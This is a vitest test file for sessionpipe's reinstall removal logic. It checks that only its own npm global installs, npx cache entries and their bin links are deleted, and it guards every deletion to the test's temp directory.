// SPDX-License-Identifier: Apache-2.0
// What `sessionpipe reinstall` may remove (reinstall/ours.ts): the proof, shape by shape
// and refusal by refusal; the one removal, which takes a folder and exactly its own bin
// link, nothing through a link, and is never npm's to do; and the guard that reads the
// sources: nothing else in reinstall/ deletes anything, nothing is handed to npm or to a
// shell to delete, and the wiring in cli.ts deletes nothing itself nor one call away.
//
// Everything is built in a temp dir. node:fs is stood in for only to watch and to fail on
// cue: every path ours.ts hands to rmSync, rmdirSync or unlinkSync is written down, and
// one that is not inside the test's temp dir is refused before it reaches the disk. So a
// mistake here, or in the proof, can't remove a copy of this computer's.
//
// The findings of the review this file pins carry their id at the start of a test's
// title: M1 (one folder under two spellings), M2 (npm is never asked to remove), M5 (a
// project's own dependency), L4 (no package.json is no proof), L6 (a removal that stops
// half-way), L3 (text from the disk), L1/L2 (the folder npm installs into), and the
// reviewer's surviving mutants of the guard, S1, S3 and S6.
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  readlinkSync,
  realpathSync,
  renameSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  ASIDE,
  binsOf,
  binTarget,
  NotOurs,
  type Proving,
  prefixOfSlot,
  prove,
  type Reach,
  remove,
  same,
  slotOf,
  within,
} from "../src/reinstall/ours.js";

type Cue = "readdirSync" | "realpathSync" | "rmSync" | "rmdirSync";
const fake = vi.hoisted(() => ({
  /** The test's temp dir. A deletion handed any other path is refused here, loudly. */
  root: "",
  /** Every path ours.ts handed to rmSync, rmdirSync or unlinkSync, in order. */
  gone: [] as string[],
  /** A builtin that fails on cue: a folder the system won't let anyone read, an entry it
   *  won't let anyone remove. */
  fails: null as ((call: Cue, p: string) => boolean) | null,
  /** node:fs as it is: what the tests build, look and clean up with. */
  real: null as unknown as typeof import("node:fs"),
}));
vi.mock("node:fs", async (original) => {
  const real = await original<typeof import("node:fs")>();
  const { default: p } = await import("node:path");
  fake.real = real;
  const watched = (what: unknown): void => {
    const s = String(what);
    fake.gone.push(s);
    const rel = fake.root ? p.relative(fake.root, s) : "..";
    if (rel === "" || rel.startsWith("..") || p.isAbsolute(rel))
      throw new Error(`a removal was handed ${s}, which is not inside the test's temp dir (${fake.root})`);
  };
  const refuse = (call: Cue, what: unknown): void => {
    if (typeof what === "string" && fake.fails?.(call, what))
      throw Object.assign(new Error(`EACCES: permission denied, ${call} '${what}'`), { code: "EACCES" });
  };
  const rmSync = ((what: unknown, ...rest: unknown[]) => {
    watched(what);
    refuse("rmSync", what);
    return (real.rmSync as (...a: unknown[]) => void)(what, ...rest);
  }) as typeof real.rmSync;
  const rmdirSync = ((what: unknown, ...rest: unknown[]) => {
    watched(what);
    refuse("rmdirSync", what);
    return (real.rmdirSync as (...a: unknown[]) => void)(what, ...rest);
  }) as typeof real.rmdirSync;
  const unlinkSync = ((what: unknown) => {
    watched(what);
    return (real.unlinkSync as (...a: unknown[]) => void)(what);
  }) as typeof real.unlinkSync;
  const readdirSync = ((what: unknown, ...rest: unknown[]) => {
    refuse("readdirSync", what);
    return (real.readdirSync as (...a: unknown[]) => unknown)(what, ...rest);
  }) as typeof real.readdirSync;
  const realpathSync = Object.assign(
    (what: unknown, ...rest: unknown[]) => {
      refuse("realpathSync", what);
      return (real.realpathSync as (...a: unknown[]) => unknown)(what, ...rest);
    },
    { native: real.realpathSync.native },
  ) as typeof real.realpathSync;
  return { ...real, rmSync, rmdirSync, unlinkSync, readdirSync, realpathSync };
});

/** What is on the disk is tested where the module runs: `reinstall` refuses on Windows
 *  before it looks, and a test there can't count on being allowed to make a link. */
const disk = describe.skipIf(process.platform === "win32");
/** Someone no folder's mode stops: a test that takes a permission away proves nothing. */
const root = process.getuid?.() === 0;

let tmp: string;
beforeEach(() => {
  tmp = realpathSync(mkdtempSync(path.join(os.tmpdir(), "sp-ours-")));
  fake.root = tmp;
  fake.gone = [];
  fake.fails = null;
});
afterEach(() => {
  fake.fails = null;
  const gone = fake.gone;
  fake.real.rmSync(tmp, { recursive: true, force: true });
  fake.root = "";
  // Whatever a test did, nothing outside its temp dir was handed to a removal.
  for (const p of gone) expect(inside(p), `${p} is inside ${tmp}`).toBe(true);
});

/** Strictly inside this test's temp dir, by its text alone (not by the code under test). */
const inside = (p: string): boolean => path.resolve(p) === p && p.startsWith(tmp + path.sep);

/** The folders these tests say were looked in as npm's global prefixes. A
 *  `lib/node_modules` in any other folder is some project's, whatever it holds. */
const looked = (): string[] =>
  [
    "prefix",
    ...Array.from({ length: 10 }, (_, n) => `prefix${n}`),
    ...["a", "b", "c", "real", "empty", "work"],
    path.join("world", ".local"),
    path.join("world", "prefix"),
    path.join("home", ".local"),
    path.join("disk", "prefix"),
  ].map((n) => path.join(tmp, n));
/** The npx cache these tests say was looked in. */
const cache = (): string => path.join(tmp, "cache", "_npx");
const posix = (reach: Reach = true, more: Partial<Proving> = {}): Proving => ({
  reach,
  prefixes: looked(),
  npx: cache(),
  ...more,
});

const PACKAGE = JSON.stringify({ name: "sessionpipe", version: "0.15.0", bin: { sessionpipe: "dist/cli.js" } });
/** A published sessionpipe as npm unpacks it: its five entries and nothing else.
 *  `json`: what its package.json holds; null for none (an install that was cut off). */
function unpack(dir: string, json: string | null = PACKAGE): string {
  mkdirSync(path.join(dir, "dist"), { recursive: true });
  writeFileSync(path.join(dir, "dist", "cli.js"), "#!/usr/bin/env node\n");
  for (const f of ["README.md", "LICENSE", "NOTICE"]) writeFileSync(path.join(dir, f), f);
  if (json !== null) writeFileSync(path.join(dir, "package.json"), json);
  return dir;
}
/** Where a prefix holds a global package. */
const slot = (prefix: string, name = "sessionpipe"): string => path.join(prefix, "lib", "node_modules", name);
/** The text of npm's bin link in `<prefix>/bin`: relative, into the package's dist. */
const INTO = path.join("..", "lib", "node_modules", "sessionpipe", "dist", "cli.js");
/** A link in a prefix's bin folder, as npm makes one. */
function link(prefix: string, to = INTO, name = "sessionpipe"): string {
  mkdirSync(path.join(prefix, "bin"), { recursive: true });
  const file = path.join(prefix, "bin", name);
  symlinkSync(to, file);
  return file;
}
/** The package folder of an npx cache entry. */
const npx = (id = "0a1b2c3d4e5f6a7b"): string => path.join(cache(), id, "node_modules", "sessionpipe");

const FOLDER = { is: "folder", slot: "global", aside: false, staging: false };
/** What the removal of a whole copy hands to a deletion, in its order: every entry a
 *  published copy has, its package.json the last of them, then the emptied folder. */
const emptied = (dir: string): string[] => [
  ...["dist", "README.md", "LICENSE", "NOTICE", "package.json"].map((e) => path.join(dir, e)),
  dir,
];
const FIVE = ["LICENSE", "NOTICE", "README.md", "dist", "package.json"];

/** Everything under the temp dir, by what it is: a folder, a link and its text, a file
 *  and its content. Two of these are equal only when nothing was added, removed or changed. */
function tree(): string[] {
  const out: string[] = [];
  const walk = (dir: string): void => {
    for (const e of fake.real.readdirSync(dir, { withFileTypes: true })) {
      const p = path.join(dir, e.name);
      const rel = path.relative(tmp, p);
      if (e.isSymbolicLink()) out.push(`${rel} -> ${fake.real.readlinkSync(p)}`);
      else if (e.isDirectory()) {
        out.push(`${rel}${path.sep}`);
        walk(p);
      } else out.push(`${rel}: ${fake.real.readFileSync(p, "utf8")}`);
    }
  };
  walk(tmp);
  return out.sort();
}
/** The tree less one folder and all that is in it. */
const without = (before: string[], ...dirs: string[]): string[] =>
  before.filter((e) => !dirs.some((d) => e.startsWith(path.relative(tmp, d) + path.sep)));

/** The removal, held to the temp dir: the path asked for, every path it answers and every
 *  path it handed to a deletion lie inside it. */
function take(what: string, o: Proving): string[] {
  expect(inside(what), `${what} is inside ${tmp}`).toBe(true);
  const said = remove(what, o);
  for (const p of [...said, ...fake.gone]) expect(inside(p), `${p} is inside ${tmp}`).toBe(true);
  return said;
}

/** What a call threw; null when it threw nothing. */
function thrownBy(call: () => unknown): unknown {
  try {
    call();
  } catch (e) {
    return e;
  }
  return null;
}

/** Not ours: the proof says why, the removal refuses in the same words, and nothing at
 *  all is removed or changed. */
function refused(what: string, o: Proving, why: string | RegExp): void {
  expect(inside(what), `${what} is inside ${tmp}`).toBe(true);
  const before = tree();
  const proof = prove(what, o);
  expect(proof.is).toBe("not");
  const said = (proof as { why: string }).why;
  if (typeof why === "string") expect(said).toBe(why);
  else expect(said).toMatch(why);
  const e = thrownBy(() => remove(what, o));
  expect(e).toBeInstanceOf(NotOurs);
  expect(e).toMatchObject({ what, why: said, message: `${what} was left alone: ${said}` });
  expect(fake.gone).toEqual([]);
  expect(tree()).toEqual(before);
}

const OUTSIDE = "it is outside the folders this sessionpipe keeps its own files in";
const NO_SLOT = "it is not a global install or an npx cache entry (a project's own dependency?)";
const LINKED = "the node_modules folder it is in is a link to somewhere else";
const PROJECT = "the node_modules folder it is in is a project's own (a package.json is beside it)";
const NO_MANIFEST = "it has no package.json that can be read (an install that was cut off?)";
const NO_RELEASE = "its package.json names no release of sessionpipe";
const KEPT = "it is the copy this run put in place";
const HOLDS = /^it holds (.+), which no published sessionpipe has \(a checkout or a build\?\)$/;

disk("the test's own tripwire", () => {
  it("a removal handed a path outside the temp dir is refused before it reaches the disk", async () => {
    const fs = await import("node:fs");
    const other = realpathSync(mkdtempSync(path.join(os.tmpdir(), "sp-ours-other-")));
    try {
      const file = path.join(other, "keep.txt");
      writeFileSync(file, "keep");
      mkdirSync(path.join(other, "empty"));
      expect(() => fs.unlinkSync(file)).toThrow("not inside the test's temp dir");
      expect(() => fs.rmSync(other, { recursive: true })).toThrow("not inside the test's temp dir");
      expect(() => fs.rmdirSync(path.join(other, "empty"))).toThrow("not inside the test's temp dir");
      expect(() => fs.rmSync(tmp, { recursive: true })).toThrow("not inside the test's temp dir");
      expect(readFileSync(file, "utf8")).toBe("keep");
      expect(existsSync(path.join(other, "empty"))).toBe(true);
      expect(fake.gone).toEqual([file, other, path.join(other, "empty"), tmp]);
    } finally {
      fake.gone = [];
      fake.real.rmSync(other, { recursive: true, force: true });
    }
  });
});

disk("by the path alone: inside a folder, the slot, the prefix, npm's name for a leftover", () => {
  it("within: the folder itself and what is under it, never beside or above it", () => {
    const world = path.join(tmp, "world");
    expect(within(world, world)).toBe(true);
    expect(within(world, path.join(world, "a", "b"))).toBe(true);
    expect(within(world, tmp)).toBe(false);
    expect(within(world, path.join(tmp, "other"))).toBe(false);
    // A name that only begins the same is another folder.
    expect(within(world, path.join(tmp, "world-2", "a"))).toBe(false);
    expect(within(world, path.join(world, "..", "world", "a"))).toBe(true);
    expect(within(world, path.join(world, "a", "..", "..", "other"))).toBe(false);
  });

  it("ASIDE: a dot, the name, eight letters or digits, and nothing else", () => {
    for (const yes of [".sessionpipe-AbCd1234", ".sessionpipe-00000000", ".sessionpipe-deadbeef"])
      expect(ASIDE.test(yes), yes).toBe(true);
    for (const no of [
      "sessionpipe",
      "sessionpipe-AbCd1234",
      ".sessionpipe-AbCd123",
      ".sessionpipe-AbCd12345",
      ".sessionpipe-AbCd123_",
      ".sessionpipe-AbCd1234.bak",
      ".other-AbCd1234",
      "x.sessionpipe-AbCd1234",
    ])
      expect(ASIDE.test(no), no).toBe(false);
  });

  it("slotOf: the lib/node_modules of a prefix that was looked in is global, an entry of the npx cache that was looked in is npx, any other place is neither", () => {
    expect(slotOf(slot(path.join(tmp, "prefix")), posix())).toBe("global");
    expect(slotOf(slot(path.join(tmp, "prefix"), ".sessionpipe-AbCd1234"), posix())).toBe("global");
    expect(slotOf(npx(), posix())).toBe("npx");
    // A project's own dependency, a folder not in a node_modules, a node_modules not in a lib.
    expect(slotOf(path.join(tmp, "proj", "node_modules", "sessionpipe"), posix())).toBeNull();
    expect(slotOf(path.join(tmp, "prefix", "lib", "sessionpipe"), posix())).toBeNull();
    expect(slotOf(path.join(tmp, "prefix", "library", "node_modules", "sessionpipe"), posix())).toBeNull();
    // A project that was named as a prefix is still no slot: its node_modules is not in a lib.
    expect(
      slotOf(
        path.join(tmp, "proj", "node_modules", "sessionpipe"),
        posix(true, { prefixes: [path.join(tmp, "proj")] }),
      ),
    ).toBeNull();
  });

  it("M5: slotOf: the same shape in a folder nobody looked in as a prefix, or outside the npx cache that was, is no slot", () => {
    const stray = slot(path.join(tmp, "app"));
    expect(slotOf(stray, posix())).toBeNull();
    expect(slotOf(stray, posix(true, { prefixes: [] }))).toBeNull();
    expect(slotOf(stray, posix(true, { prefixes: [path.join(tmp, "app")] }))).toBe("global");
    // A prefix that only begins like one that was looked in, and one above or below it.
    expect(slotOf(slot(path.join(tmp, "prefix-2")), posix())).toBeNull();
    expect(slotOf(slot(tmp), posix())).toBeNull();
    expect(slotOf(slot(path.join(tmp, "prefix", "lib")), posix())).toBeNull();
    // An entry of some other cache; of no cache at all.
    const other = path.join(tmp, "other", "_npx", "0a1b2c3d4e5f6a7b", "node_modules", "sessionpipe");
    expect(slotOf(other, posix())).toBeNull();
    expect(slotOf(other, posix(true, { npx: path.join(tmp, "other", "_npx") }))).toBe("npx");
    expect(slotOf(npx(), posix(true, { npx: null }))).toBeNull();
    // The cache folder itself is no entry of it, nor is a folder two below it.
    expect(slotOf(path.join(cache(), "node_modules", "sessionpipe"), posix())).toBeNull();
    expect(slotOf(path.join(cache(), "x", "y", "node_modules", "sessionpipe"), posix())).toBeNull();
  });

  it("prefixOfSlot: three folders up", () => {
    const prefix = path.join(tmp, "prefix");
    expect(prefixOfSlot(slot(prefix))).toBe(prefix);
    expect(prefixOfSlot(slot(prefix, ".sessionpipe-AbCd1234"))).toBe(prefix);
  });
});

disk("same: one folder, by whatever name it is reached", () => {
  it("M1: a folder and a link to it are one folder, and so is everything under them", () => {
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    symlinkSync(home, path.join(tmp, "link"));
    const other = slot(path.join(tmp, "link", ".local"));
    expect(other).not.toBe(dir);
    expect(same(dir, other)).toBe(true);
    expect(same(other, dir)).toBe(true);
    expect(same(path.join(home, ".local"), path.join(tmp, "link", ".local"))).toBe(true);
    // Two folders are two, however alike.
    const b = unpack(slot(path.join(tmp, "b")));
    expect(same(dir, b)).toBe(false);
    expect(same(path.dirname(dir), dir)).toBe(false);
    // The path written two ways is one path, there or not.
    expect(same(dir, [path.dirname(dir), "x", "..", "sessionpipe"].join(path.sep))).toBe(true);
    expect(same(dir + path.sep, dir)).toBe(true);
    expect(same(path.join(tmp, "nothing"), path.join(tmp, "nothing"))).toBe(true);
    // What is not there is the same only by its name: never as another name, never as
    // a folder that is there.
    expect(same(path.join(tmp, "nothing"), path.join(tmp, "nothing-else"))).toBe(false);
    expect(same(path.join(tmp, "nothing"), dir)).toBe(false);
    expect(same(dir, path.join(tmp, "nothing"))).toBe(false);
    expect(same(path.join(tmp, "link", "nothing"), path.join(home, "nothing"))).toBe(false);
  });

  it("M1: on a disk that ignores case, a folder written in another case is the same folder", (ctx) => {
    mkdirSync(path.join(tmp, "CaseProbe"));
    // A disk that tells the two apart has two folders there: nothing to test.
    if (!existsSync(path.join(tmp, "caseprobe"))) return ctx.skip();
    const dir = unpack(slot(path.join(tmp, "home", ".local")));
    const other = slot(path.join(tmp, "home", ".Local"));
    expect(other).not.toBe(dir);
    expect(same(dir, other)).toBe(true);
    expect(same(dir, slot(path.join(tmp, "HOME", ".LOCAL")))).toBe(true);
    // The slot of a prefix that was looked in under another case, and the copy that is kept.
    const o = posix(true, { prefixes: [path.join(tmp, "home", ".Local")] });
    expect(slotOf(dir, o)).toBe("global");
    expect(prove(dir, o)).toEqual(FOLDER);
    expect(prove(dir, { ...o, keep: [other] })).toEqual({ is: "not", why: KEPT });
    expect(fake.gone).toEqual([]);
  });

  it("M1: slotOf knows a prefix, and the npx cache, that were looked in under another name", () => {
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    symlinkSync(home, path.join(tmp, "link"));
    const viaLink = path.join(tmp, "link", ".local");
    // The prefix was named through the link; the copy is asked for by its real name.
    expect(slotOf(dir, posix(true, { prefixes: [viaLink] }))).toBe("global");
    // And the other way round.
    expect(slotOf(slot(viaLink), posix(true, { prefixes: [path.join(home, ".local")] }))).toBe("global");
    expect(slotOf(dir, posix(true, { prefixes: [path.join(tmp, "b")] }))).toBeNull();
    expect(prove(dir, posix(true, { prefixes: [viaLink] }))).toEqual(FOLDER);

    const entry = unpack(npx());
    symlinkSync(path.join(tmp, "cache"), path.join(tmp, "npm"));
    expect(slotOf(entry, posix(true, { npx: path.join(tmp, "npm", "_npx") }))).toBe("npx");
    expect(prove(entry, posix(true, { npx: path.join(tmp, "npm", "_npx") }))).toEqual({ ...FOLDER, slot: "npx" });
  });
});

disk("binTarget: the folder a bin link leads to, read from the link and never followed", () => {
  it("npm's own link, relative or absolute, names its package folder", () => {
    const prefix = path.join(tmp, "prefix");
    unpack(slot(prefix));
    expect(binTarget(link(prefix))).toBe(slot(prefix));
    const other = path.join(tmp, "other");
    expect(binTarget(link(other, path.join(slot(prefix), "dist", "cli.js")))).toBe(slot(prefix));
  });

  it("a link to a folder that is gone still names it", () => {
    const prefix = path.join(tmp, "prefix");
    expect(binTarget(link(prefix))).toBe(slot(prefix));
    expect(existsSync(slot(prefix))).toBe(false);
  });

  it("a relative link leads from the folder it is really in, by whatever name that was reached", () => {
    // ~/bin is another name for ~/.local/bin: the link's `..` is ~/.local, not ~.
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    const file = link(path.join(home, ".local"));
    symlinkSync(path.join(home, ".local", "bin"), path.join(home, "bin"));
    expect(binTarget(file)).toBe(dir);
    expect(binTarget(path.join(home, "bin", "sessionpipe"))).toBe(dir);
    // A bin folder that can't be found by its real name names nothing.
    fake.fails = (call, p) => call === "realpathSync" && p === path.join(home, "bin");
    expect(binTarget(path.join(home, "bin", "sessionpipe"))).toBeNull();
  });

  it("a link of another name, or one that leads anywhere else, is nobody's", () => {
    const prefix = path.join(tmp, "prefix");
    unpack(slot(prefix));
    // The right text under another name.
    expect(binTarget(link(prefix, INTO, "sp"))).toBeNull();
    // The right name, leading to another package, to another file of this one, to the
    // folder itself, to a program.
    const to = (text: string) => binTarget(link(path.join(tmp, `p${text.length}`), text));
    expect(to(path.join("..", "lib", "node_modules", "other", "dist", "cli.js"))).toBeNull();
    expect(to(path.join("..", "lib", "node_modules", "sessionpipe", "dist", "hook.js"))).toBeNull();
    expect(to(path.join("..", "lib", "node_modules", "sessionpipe"))).toBeNull();
    expect(to(path.join("..", "lib", "sessionpipe", "dist", "cli.js"))).toBeNull();
    expect(to("/usr/bin/true")).toBeNull();
  });

  it("a plain file of the name is no link, and nothing there is nothing", () => {
    const bin = path.join(tmp, "prefix", "bin");
    mkdirSync(bin, { recursive: true });
    writeFileSync(
      path.join(bin, "sessionpipe"),
      `#!/bin/sh\nexec node ${slot(path.join(tmp, "prefix"))}/dist/cli.js\n`,
    );
    expect(binTarget(path.join(bin, "sessionpipe"))).toBeNull();
    expect(binTarget(path.join(bin, "nothing"))).toBeNull();
    // A folder of the name.
    mkdirSync(path.join(tmp, "dir", "sessionpipe"), { recursive: true });
    expect(binTarget(path.join(tmp, "dir", "sessionpipe"))).toBeNull();
  });
});

disk("binsOf: the bin links that are a package folder's own", () => {
  it("a global copy: the link in its prefix's bin, when it leads to this folder", () => {
    const prefix = path.join(tmp, "prefix");
    const dir = unpack(slot(prefix));
    // No bin folder at all, then one with no link in it.
    expect(binsOf(dir, posix())).toEqual([]);
    mkdirSync(path.join(prefix, "bin"));
    expect(binsOf(dir, posix())).toEqual([]);
    const file = link(prefix);
    link(prefix, path.join("..", "lib", "node_modules", "other", "dist", "cli.js"), "other");
    expect(binsOf(dir, posix())).toEqual([file]);
    // The folder moved aside in the same slot has no link: the one there is the copy's.
    expect(binsOf(slot(prefix, ".sessionpipe-AbCd1234"), posix())).toEqual([]);
    // In a prefix that was not looked in the folder is in no slot, and has no link.
    expect(binsOf(dir, posix(true, { prefixes: [] }))).toEqual([]);
  });

  it("a link in its prefix that leads to another prefix's copy is not its own", () => {
    const a = path.join(tmp, "a");
    const b = path.join(tmp, "b");
    unpack(slot(a));
    unpack(slot(b));
    link(a, path.join(slot(b), "dist", "cli.js"));
    expect(binsOf(slot(a), posix())).toEqual([]);
    expect(binsOf(slot(b), posix())).toEqual([]);
  });

  it("a bin folder that is a link to another prefix's: the link in it is that prefix's copy's", () => {
    const a = path.join(tmp, "a");
    const b = path.join(tmp, "b");
    unpack(slot(a));
    unpack(slot(b));
    const own = link(b);
    symlinkSync(path.join(b, "bin"), path.join(a, "bin"));
    // <a>/bin/sessionpipe is the very link in <b>/bin, and from there `..` is <b>.
    expect(binTarget(path.join(a, "bin", "sessionpipe"))).toBe(slot(b));
    expect(binsOf(slot(a), posix())).toEqual([]);
    expect(binsOf(slot(b), posix())).toEqual([own]);
  });

  it("M1: the link of a copy that is asked for by another name of its folder is its own all the same", () => {
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    const file = link(path.join(home, ".local"));
    symlinkSync(home, path.join(tmp, "link"));
    const other = slot(path.join(tmp, "link", ".local"));
    // Asked for through the link, its bin link is the one in the bin folder of that name;
    // the link's own text leads to the folder by its real name, and that is this folder.
    expect(binsOf(dir, posix())).toEqual([file]);
    expect(binsOf(other, posix())).toEqual([path.join(tmp, "link", ".local", "bin", "sessionpipe")]);
  });

  it("an npx cache entry: the link in the `.bin` beside it", () => {
    const dir = unpack(npx());
    const bin = path.join(path.dirname(dir), ".bin");
    mkdirSync(bin);
    symlinkSync(path.join("..", "sessionpipe", "dist", "cli.js"), path.join(bin, "sessionpipe"));
    symlinkSync(path.join("..", "other", "cli.js"), path.join(bin, "other"));
    expect(binsOf(dir, posix())).toEqual([path.join(bin, "sessionpipe")]);
    // In a cache that was not looked in it is no entry, and has no link.
    expect(binsOf(dir, posix(true, { npx: null }))).toEqual([]);
  });

  it("a folder in no slot has none, whatever lies beside it", () => {
    const dir = unpack(path.join(tmp, "proj", "node_modules", "sessionpipe"));
    const bin = path.join(path.dirname(dir), ".bin");
    mkdirSync(bin);
    symlinkSync(path.join("..", "sessionpipe", "dist", "cli.js"), path.join(bin, "sessionpipe"));
    expect(binsOf(dir, posix())).toEqual([]);
  });
});

disk("prove: what is ours", () => {
  it("a published copy in the global slot of a prefix that was looked in", () => {
    const dir = unpack(slot(path.join(tmp, "prefix")));
    expect(prove(dir, posix())).toEqual(FOLDER);
    // The one prefix is enough, and so is no npx cache at all.
    expect(prove(dir, { reach: true, prefixes: [path.join(tmp, "prefix")], npx: null })).toEqual(FOLDER);
  });

  it("what this very package publishes: its own files and package.json, and no dependency unpacked beside them", () => {
    // The proof knows a published sessionpipe by what it holds. A release that published
    // one more entry, or gained a dependency (npm unpacks those into a node_modules folder
    // inside the package), would be left alone by every reinstall after it: this fails first.
    const own = JSON.parse(readFileSync(fileURLToPath(new URL("../package.json", import.meta.url)), "utf8")) as {
      name: string;
      version: string;
      files: string[];
      dependencies?: Record<string, string>;
      optionalDependencies?: Record<string, string>;
      bundleDependencies?: string[];
      bundledDependencies?: string[];
    };
    expect({
      ...own.dependencies,
      ...own.optionalDependencies,
      ...Object.fromEntries(
        [...(own.bundleDependencies ?? []), ...(own.bundledDependencies ?? [])].map((d) => [d, "*"]),
      ),
    }).toEqual({});
    const published = ["package.json", ...own.files];
    expect([...published].sort()).toEqual(FIVE);
    const dir = slot(path.join(tmp, "prefix"));
    mkdirSync(dir, { recursive: true });
    // Its own name and its own release are what the proof reads in a package.json.
    for (const f of published)
      writeFileSync(
        path.join(dir, f),
        f === "package.json" ? JSON.stringify({ name: own.name, version: own.version }) : f,
      );
    expect(prove(dir, posix())).toEqual(FOLDER);
  });

  it("a published copy in an entry of the npx cache that was looked in", () => {
    expect(prove(unpack(npx()), posix())).toEqual({ ...FOLDER, slot: "npx" });
  });

  it("a whole copy npm moved aside in a global slot", () => {
    const dir = unpack(slot(path.join(tmp, "prefix"), ".sessionpipe-AbCd1234"));
    expect(prove(dir, posix())).toEqual({ ...FOLDER, aside: true });
  });

  it("a release of any kind the version rules know: a prerelease, one with a build, one with a `v`", () => {
    let n = 0;
    for (const version of ["0.15.0", "1.0.0-rc.1", "2.3.4+build.5", "v0.14.2", " 0.15.0\n"]) {
      const dir = unpack(slot(path.join(tmp, `prefix${n++}`)), JSON.stringify({ name: "sessionpipe", version }));
      expect(prove(dir, posix()), version).toEqual(FOLDER);
    }
  });

  it("where reach is one folder, what lies inside it", () => {
    const world = path.join(tmp, "world");
    const dir = unpack(slot(path.join(world, ".local")));
    expect(prove(dir, posix(world))).toEqual(FOLDER);
    expect(prove(dir, posix(tmp))).toEqual(FOLDER);
  });

  it("a bin link whose folder is gone, in a prefix's bin or in an npx entry's `.bin`", () => {
    expect(prove(link(path.join(tmp, "prefix")), posix())).toEqual({ is: "link" });
    const bin = path.join(path.dirname(npx()), ".bin");
    mkdirSync(bin, { recursive: true });
    symlinkSync(path.join("..", "sessionpipe", "dist", "cli.js"), path.join(bin, "sessionpipe"));
    expect(prove(path.join(bin, "sessionpipe"), posix())).toEqual({ is: "link" });
    expect(prove(path.join(bin, "sessionpipe"), posix(tmp))).toEqual({ is: "link" });
  });

  it("a copy that is not among the ones kept", () => {
    const dir = unpack(slot(path.join(tmp, "a")));
    const home = unpack(slot(path.join(tmp, "b")));
    expect(prove(dir, posix(true, { keep: [] }))).toEqual(FOLDER);
    expect(prove(dir, posix(true, { keep: [home, path.join(tmp, "nothing")] }))).toEqual(FOLDER);
  });
});

disk("prove and remove: what is not ours, each with its reason, and nothing removed", () => {
  it("anything where this sessionpipe may call nothing its own, or outside the one folder it may", () => {
    const dir = unpack(slot(path.join(tmp, "prefix")));
    refused(dir, posix(null), OUTSIDE);
    refused(dir, posix(path.join(tmp, "world")), OUTSIDE);
    // A folder whose name only begins like the reach is outside it.
    refused(dir, posix(path.join(tmp, "pre")), OUTSIDE);
    // The proof stops there: what is not in reach is not even looked at.
    refused(path.join(tmp, "nothing"), posix(null), OUTSIDE);
  });

  it("a link outside the reach, though the folder it leads to is gone", () => {
    refused(link(path.join(tmp, "prefix")), posix(path.join(tmp, "world")), OUTSIDE);
    refused(link(path.join(tmp, "prefix2")), posix(null), OUTSIDE);
  });

  it("nothing there", () => {
    mkdirSync(path.join(tmp, "prefix", "lib", "node_modules"), { recursive: true });
    refused(slot(path.join(tmp, "prefix")), posix(), "nothing is there");
    refused(path.join(tmp, "prefix", "bin", "sessionpipe"), posix(), "nothing is there");
  });

  it("a file that only has the name", () => {
    const bin = path.join(tmp, "prefix", "bin");
    mkdirSync(bin, { recursive: true });
    writeFileSync(path.join(bin, "sessionpipe"), "#!/bin/sh\nexec node ~/src/sessionpipe/packages/cli/dist/cli.js\n");
    refused(path.join(bin, "sessionpipe"), posix(), "it is a file npm didn't put there");
    // A file where a package folder would be.
    mkdirSync(path.join(tmp, "prefix", "lib", "node_modules"), { recursive: true });
    writeFileSync(slot(path.join(tmp, "prefix")), "not a folder");
    refused(slot(path.join(tmp, "prefix")), posix(), "it is a file npm didn't put there");
  });

  it("a link that leads somewhere that is no sessionpipe install", () => {
    const why = "it is a link that doesn't lead into a sessionpipe install";
    const checkout = unpack(path.join(tmp, "src", "sessionpipe", "packages", "cli"));
    refused(link(path.join(tmp, "a"), path.join(checkout, "dist", "cli.js")), posix(), why);
    refused(link(path.join(tmp, "b"), "/usr/bin/true"), posix(), why);
    refused(link(path.join(tmp, "c"), INTO, "sp"), posix(), why);
  });

  it("a folder someone linked (`npm link`): the link is not followed, and what it leads to stays", () => {
    const checkout = unpack(path.join(tmp, "src", "sessionpipe"));
    const prefix = path.join(tmp, "prefix");
    mkdirSync(path.dirname(slot(prefix)), { recursive: true });
    symlinkSync(checkout, slot(prefix));
    refused(slot(prefix), posix(), "it is a link that doesn't lead into a sessionpipe install");
    expect(lstatSync(slot(prefix)).isSymbolicLink()).toBe(true);
    expect(readdirSync(checkout).sort()).toEqual(FIVE);
  });

  it("a bin link into a project's own dependency, though that is gone; and into a prefix nobody looked in", () => {
    const proj = path.join(tmp, "proj");
    const why = "it leads to a sessionpipe that is not a global install or an npx cache entry";
    refused(link(proj, path.join(proj, "node_modules", "sessionpipe", "dist", "cli.js")), posix(), why);
    unpack(path.join(proj, "node_modules", "sessionpipe"));
    refused(path.join(proj, "bin", "sessionpipe"), posix(), why);
    // npm's own words for a link, in a folder that is no prefix of anyone's.
    refused(link(path.join(tmp, "app")), posix(), why);
  });

  it("the link of a copy that is there: it goes with its folder, never by itself", () => {
    const prefix = path.join(tmp, "prefix");
    unpack(slot(prefix));
    refused(link(prefix), posix(), "it is the link of a copy that is there");
    // Also where what is there is no copy of ours: a checkout in the slot, a file.
    const b = path.join(tmp, "b");
    mkdirSync(path.join(unpack(slot(b)), "src"));
    refused(link(b), posix(), "it is the link of a copy that is there");
    const c = path.join(tmp, "c");
    mkdirSync(path.dirname(slot(c)), { recursive: true });
    writeFileSync(slot(c), "a file");
    refused(link(c), posix(), "it is the link of a copy that is there");
  });

  it("the link of a copy that is there, asked for by another name of the folder it is in", () => {
    // Read from ~/bin its `..` would be ~, where no copy is: it would pass for a link
    // whose folder is gone, and a command that works would be taken away.
    const home = path.join(tmp, "home");
    const dir = unpack(slot(path.join(home, ".local")));
    const file = link(path.join(home, ".local"));
    symlinkSync(path.join(home, ".local", "bin"), path.join(home, "bin"));
    refused(path.join(home, "bin", "sessionpipe"), posix(), "it is the link of a copy that is there");
    refused(path.join(home, "bin", "sessionpipe"), posix(home), "it is the link of a copy that is there");
    expect(binTarget(file)).toBe(dir);
    expect(binsOf(dir, posix())).toEqual([file]);
  });

